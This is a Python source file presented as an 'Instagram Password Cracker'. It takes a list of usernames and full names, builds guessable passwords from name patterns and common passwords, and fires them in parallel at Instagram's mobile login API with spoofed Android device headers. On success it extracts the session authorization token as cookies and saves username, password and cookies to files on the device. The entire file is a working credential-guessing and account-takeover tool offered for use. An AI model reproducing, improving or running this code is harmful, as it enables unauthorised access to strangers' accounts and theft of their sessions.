#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
File-based password cracking with smart patterns
Author: BITHIKA
Version: 2.0
"""
import hashlib
import uuid
import time
import urllib.parse
import random
import requests
import re
import json
import base64
import sys
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Color codes
G1 = "\033[1;92m"  # Green
G2 = "\033[1;96m"  # Cyan
A = "\033[1;97m"   # White
R = "\033[1;91m"   # Red
Y = "\033[1;93m"   # Yellow

# Global variables with proper initialization
loop = 0
oks = []
cps = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def logo():
    """Display the program logo"""
    logo_text = f"""
{G1}╔══════════════════════════════════════════════════════╗
{G1}║    ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗    ║
{G1}║    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝    ║
{G1}║    ██║██╔██╗ ██║███████╗   ██║   ███████║██║         ║
{G1}║    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║         ║
{G1}║    ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╗    ║
{G1}║    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ║
{G1}║    {A}Instagram Password Cracker v2.0               {G1}║
{G1}║    {A}Smart Pattern Generation                      {G1}║
{G1}╚══════════════════════════════════════════════════════╝
"""
    print(logo_text)

def generate_passwords_from_patterns(user_id, name, patterns):
    """Generate passwords from user-defined patterns"""
    passwords = []
    
    if name:
        # Split name into first and last
        name_parts = name.split()
        if len(name_parts) >= 2:
            fs = name_parts[0]  # First name
            ls = name_parts[-1] # Last name
        else:
            fs = name
            ls = name
    else:
        fs = user_id
        ls = user_id
    
    full_name = name if name else user_id
    
    # Apply each pattern
    for pattern in patterns:
        # Apply your exact replacement logic
        ps = pattern.replace('first', fs.lower()).replace('First', fs)
        ps = ps.replace('last', ls.lower()).replace('Last', ls)
        ps = ps.replace('Name', full_name).replace('name', full_name.lower())
        passwords.append(ps)
    
    # Always add some common patterns
    common_passwords = [
        user_id,
        user_id[:6],
        user_id[:8],
        '123456',
        '12345678',
        'password',
        'Password',
        'qwerty',
        'admin',
        'welcome',
        'iloveyou',
        'monkey',
        '57273200',
        fs.lower(),
        fs.lower() + '123',
        fs.lower() + '1234',
        fs.lower() + '12345',
        fs,
        fs + '123',
        fs + '1234',
        fs + '12345',
        ls.lower(),
        ls.lower() + '123',
        ls,
        ls + '123',
        full_name.lower(),
        full_name.lower() + '123',
        full_name.lower() + '1234',
        full_name,
        full_name + '123'
    ]
    
    passwords.extend(common_passwords)
    
    # Remove duplicates
    unique_passwords = []
    seen = set()
    for pw in passwords:
        if pw and pw not in seen:
            seen.add(pw)
            unique_passwords.append(pw)
    
    return unique_passwords

def crack_account(uid, password_list, total_count, name=None):
    """Crack a single Instagram account"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
            sys.stdout.flush()
            
            # Create session and generate device hash
            session = requests.Session()
            # Generate device ID and other required IDs
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            family_device_id = str(uuid.uuid4())
        
            # First hash for username+password
            first_hash = hashlib.md5()
            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
            first_hex = first_hash.hexdigest()
        
            # Second hash with salt for device ID
            second_hash = hashlib.md5()
            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
            android_id_hash = second_hash.hexdigest()[:16]
        
            # Generate user agent
            useragent = f'Instagram {random.randint(111, 999)}.0.0.{random.randint(1, 99)}.{random.randint(1, 9)} Android ({random.randint(21, 31)}/{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}; {random.randint(280, 1080)}x{random.randint(720, 1920)}; samsung; SM-G973F; samsung; {random.choice(["exynos9820", "sm6150"])}; en_US; {random.randint(100000000, 999999999)})'
            
            headers = {
            'host': 'i.instagram.com',
            'x-ig-app-locale': 'in_ID',
            'x-ig-device-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
            'x-pigeon-rawclienttime': f'{time.time():.3f}',
            'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            'x-ig-www-claim': '0',
            'x-bloks-is-prism-enabled': 'false',
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-device-id': device_id,
            'x-ig-family-device-id': family_device_id,
            'x-ig-android-id': f'android-{android_id_hash}',
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-ig-capabilities': '3brTv10=',
            'priority': 'u=3',
            'user-agent': useragent,
            'accept-language': 'id-ID, en-US',
            'x-mid': '',
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
            'x-ig-app-id': '3419628305025917',
            'connection': 'keep-alive'
            }
            
            # Generate timestamp for password
            timestamp = int(time.time())
        
            # URL encode username and password
            encoded_username = urllib.parse.quote(uid)
            encoded_password = urllib.parse.quote(pw)
        
            # Generate encrypted password format
            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
            
            # Prepare the encoded data
            params_dict = {
            "client_input_params": {
                "device_id": f"android-{android_id_hash}",
                "login_attempt_count": 1,
                "secure_family_device_id": "",
                "machine_id": "",
                "accounts_list": [],
                "auth_secure_device_id": "",
                "password": encrypted_password,
                "family_device_id": family_device_id,
                "fb_ig_device_id": [],
                "device_emails": [],
                "try_num": 3,
                "event_flow": "login_manual",
                "event_step": "home_page",
                "openid_tokens": {},
                "client_known_key_hash": "",
                "contact_point": encoded_username,
                "encrypted_msisdn": ""
            },
            "server_params": {
                "username_text_input_id": "p5hbnc:46",
                "device_id": f"android-{android_id_hash}",
                "should_trigger_override_login_success_action": 0,
                "server_login_source": "login",
                "waterfall_id": str(uuid.uuid4()),
                "login_source": "Login",
                "INTERNAL__latency_qpl_instance_id": 152086072800150,
                "reg_flow_source": "login_home_native_integration_point",
                "is_platform_login": 0,
                "is_caa_perf_enabled": 0,
                "credential_type": "password",
                "family_device_id": family_device_id,
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "INTERNAL_INFRA_THEME": "harm_f",
                "password_text_input_id": "p5hbnc:47",
                "ar_event_source": "login_home_page"
            }
        }
        
            # Convert params to JSON string and URL encode
            params_json = json.dumps(params_dict)
            encoded_params = urllib.parse.quote(params_json)
        
            # Prepare the complete encoded string
            encode = f'params={encoded_params}&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
        
            # Update content-length in headers
            headers['content-length'] = str(len(encode))
            
            # login url 
            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
            
            # Make API request
            response = session.post(
                url, 
                data=encode, 
                headers=headers, 
                allow_redirects=True,
                timeout=30
            )
            
            # Check response
            if 'logged_in_user' in response.text:
                print(f"\r{G1}[{A}✓{G1}] {G1}SUCCESS {A}:{G1} {uid} | {pw}")
                if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
                   decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
                   cookies = ';'.join(f'{k}={v}' for k,v in decoded.items())
                   print(f"{G1}[{A}🍪{G1}] {G1}COOKIES {A}:{G2} {cookies}")
                   with open("/sdcard/SUCCESS_ACCOUNTS.txt","a") as f:
                       f.write(f"{uid}|{pw}|{cookies}\n")
                   with success_lock:
                       oks.append(uid)
                   return True       
            elif 'challenge_required' in response.text:
                with open("/sdcard/CHALLENGE_ACCOUNTS.txt","a") as f:
                    f.write(f"{uid}|{pw}\n")
                with success_lock:
                    cps.append(uid)
                continue
            elif 'checkpoint_required' in response.text:
                with open("/sdcard/CHECKPOINT_ACCOUNTS.txt","a") as f:
                    f.write(f"{uid}|{pw}\n")
                with success_lock:
                    cps.append(uid)
                continue
            else:
                continue
                
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException:
        return False
    except KeyboardInterrupt:
        print(f"\r{R}[{A}!{R}] {R}INTERRUPTED BY USER")
        raise
    except Exception:
        return False
    
    return False

def advanced_cracking():
    """Advanced file cracking with custom password patterns"""
    global oks, cps
    clear()
    logo()
    
    # Get file path
    print(f'{G1}[{A}/{G1}]{G1} EXAMPLE {A}:{G1} sdcard/users.txt')
    linex()
    dfile = input(f'{G1}[{A}\\{G2}]{G2} ENTER FILE PATH {A}:{G2} ')
    
    try:
        # Read the file
        with open(dfile, 'r', encoding='utf-8', errors='ignore') as f:
            dx = f.read().splitlines()
    except FileNotFoundError:
        print(f'{R}[{A}×{R}]{R} FILE NOT FOUND...')
        time.sleep(2)
        advanced_cracking()
        return
    
    # Get password patterns from user
    dplist = []
    clear()
    logo()
    
    try:
        pass_limit = int(input(f'{G1}[{A}/{G2}]{G2} ENTER NUMBER OF PASSWORD PATTERNS {A}:{G2} '))
    except:
        pass_limit = 1
    
    print(f'\n{G1}[{A}\\{G2}]{G2} EXAMPLE PATTERNS: {A}firstlast, First123, name123, firstname')
    print(f'{G1}[{A}ℹ{G2}]{G2} Use keywords: first, First, last, Last, name, Name')
    print(f'{G1}[{A}ℹ{G2}]{G2} These will be replaced with actual user names')
    linex()
    
    for i in range(pass_limit):
        pattern = input(f'{G1}[{A}\\{G2}]{G2} PATTERN NO.{i+1} {A}:{G2} ')
        if pattern.strip():
            dplist.append(pattern.strip())
    
    # If no patterns entered, use defaults
    if not dplist:
        dplist = ['firstlast', 'First123', 'name123', 'firstname']
        print(f'{Y}[{A}!{Y}]{Y} USING DEFAULT PATTERNS')
    
    # Reset counters
    with counter_lock:
        global loop
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Start cracking
    clear()
    logo()
    total_ids = str(len(dx))
    print(f'{G1}[{A}+{G1}]{G1} TOTAL IDS {A}:{G1} {total_ids}')
    print(f'{G1}[{A}+{G1}]{G1} PATTERNS {A}:{G2} {", ".join(dplist)}')
    print(f'{G1}[{A}+{G1}]{G1} IF NO RESULT {A}[{Y}ON{A}/{Y}OFF{A}] {G1}AIRPLANE MODE')
    linex()
    
    start_time = time.time()
    
    # Use ThreadPoolExecutor instead of ThreadPool
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        
        for user in dx:
            if '|' in user:
                try:
                    ids, names = user.split('|', 1)
                    ids = ids.strip()
                    names = names.strip()
                except:
                    ids = user.strip()
                    names = None
            else:
                ids = user.strip()
                names = None
            
            # Generate passwords for this user
            passlist = generate_passwords_from_patterns(ids, names, dplist)
            
            # Submit task
            future = executor.submit(crack_account, ids, passlist, len(dx), names)
            futures.append(future)
        
        # Wait for completion
        for future in futures:
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n{R}[{A}!{R}]{R} INTERRUPTED BY USER!")
                executor.shutdown(wait=False)
                break
            except Exception as e:
                print(f"\n{R}[{A}!{R}]{R} ERROR: {e}")
    
    # Display results
    end_time = time.time()
    execution_time = end_time - start_time
    
    print('')
    linex()
    print(f'{G1}[{A}+{G1}]{G1} PROCESS COMPLETED')
    print(f'{G1}[{A}+{G1}]{G1} TOTAL IDS {A}:{G1} {len(dx)}')
    print(f'{G1}[{A}+{G1}]{G1} SUCCESSFUL {A}:{G1} {len(oks)}')
    print(f'{G1}[{A}+{G1}]{G1} FAILED {A}:{R} {len(cps)}')
    print(f'{G1}[{A}+{G1}]{G1} TIME TAKEN {A}:{Y} {execution_time:.2f}s')
    linex()
    
    if len(oks) > 0:
        print(f'{G1}[{A}🎉{G1}]{G1} SUCCESSFUL ACCOUNTS SAVED TO /sdcard/SUCCESS_ACCOUNTS.txt')
    
    input(f'\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...')

def file_crack():
    """Simple file-based cracking function"""
    clear()
    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/users.txt')
    linex()
    print(f'{G1}[{A}ℹ{G2}]{G2} File Format: username|Full Name (one per line)')
    print(f'{G1}[{A}ℹ{G2}]{G2} Example: john_doe234|John Doe')
    linex()
    
    # Voice prompt
    try:
        os.system('espeak -a 150 "ENTER YOUR FILE NAME"')
    except:
        pass
    
    file_name = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
    
    try:
        # Read the file
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
            user_list = f.read().splitlines()
        
        if not user_list:
            print(f'{G1}[{A}={G2}]{G2} FILE IS EMPTY...')
            time.sleep(2)
            return
        
        # Default password patterns
        default_patterns = ['firstlast', 'First123', 'name123', 'firstname']
        
        # Reset counters
        global loop, oks, cps
        with counter_lock:
            loop = 0
        with success_lock:
            oks.clear()
        cps.clear()
        
        start_time = time.time()
        
        # Process users
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for user_entry in user_list:
                # Parse user entry (format: username|Full Name)
                if '|' in user_entry:
                    uid, name = user_entry.split('|', 1)
                    uid = uid.strip()
                    name = name.strip()
                else:
                    uid = user_entry.strip()
                    name = None
                
                # Generate passwords for this user
                password_patterns = generate_passwords_from_patterns(uid, name, default_patterns)
                
                # Submit task
                future = executor.submit(crack_account, uid, password_patterns, len(user_list), name)
                futures.append(future)
            
            # Wait for completion
            for future in futures:
                try:
                    future.result()
                except KeyboardInterrupt:
                    print(f"\n{R}[{A}!{R}]{R} INTERRUPTED BY USER!")
                    executor.shutdown(wait=False)
                    break
                except Exception as e:
                    print(f"\n{R}[{A}!{R}]{R} ERROR: {e}")
        
        # Display results
        end_time = time.time()
        execution_time = end_time - start_time
        
        clear()
        print(f"\n{G1}[{A}={G1}]{G1} FILE CRACKING COMPLETED!")
        linex()
        print(f"{G1}[{A}✓{G2}]{G2} Total Users: {len(user_list)}")
        print(f"{G1}[{A}✓{G2}]{G2} Success: {len(oks)}")
        print(f"{G1}[{A}✗{G2}]{G2} Failed: {len(cps)}")
        print(f"{G1}[{A}⏱️{G2}]{G2} Time: {execution_time:.2f}s")
        print(f"{G1}[{A}🚀{G2}]{G2} Speed: {len(user_list)/execution_time:.2f} users/s")
        linex()
        
        if len(oks) > 0:
            print(f"{G1}[{A}🎉{G2}]{G2} SUCCESSFUL ACCOUNTS SAVED TO: /sdcard/SUCCESS_ACCOUNTS.txt")
        
        input(f"\n{G1}[{A}!{G2}]{G2} PRESS ENTER TO RETURN TO MENU...")
        
    except FileNotFoundError:
        print(f'{G1}[{A}={G2}]{G2} FILE NOT FOUND ...')
        time.sleep(2)
        retry = input(f'{G1}[{A}?{G2}]{G2} Try again? (y/n) {A}:{G2} ')
        if retry.lower() == 'y':
            file_crack()
    except Exception as e:
        print(f'{G1}[{A}={G2}]{G2} ERROR: {str(e)}')
        time.sleep(2)

def show_statistics():
    """Show program statistics"""
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
    print(f" \033[1;97m[💾] Files saved to /sdcard/")
    print(f"  └─ \033[1;92mSUCCESS_ACCOUNTS.txt")
    print(f"  └─ \033[1;93mCHALLENGE_ACCOUNTS.txt")
    print(f"  └─ \033[1;91mCHECKPOINT_ACCOUNTS.txt")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        logo()
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 📁 Simple File Cracking")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 🎯 Advanced Cracking (Custom Patterns)")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            file_crack()
        elif choice == '2':
            advanced_cracking()
        elif choice == '3':
            show_statistics()
        elif choice == '4':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in /sdcard/")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, 3, or 4.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
